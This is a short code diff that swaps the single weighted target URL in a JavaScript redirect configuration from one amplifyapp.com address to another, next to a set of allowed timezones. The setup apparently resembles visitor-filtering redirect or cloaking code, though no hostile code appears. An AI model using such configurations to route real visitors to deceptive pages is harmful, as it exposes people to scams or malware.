@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://main.d24yjq7d1kyen9.amplifyapp.com/index.html", weight: 1.0 }
+    { url: "https://main.d3nq8pvnvgldio.amplifyapp.com/Win0codejInfowj2n/index.html", weight: 1.0 }
 
 ];
 
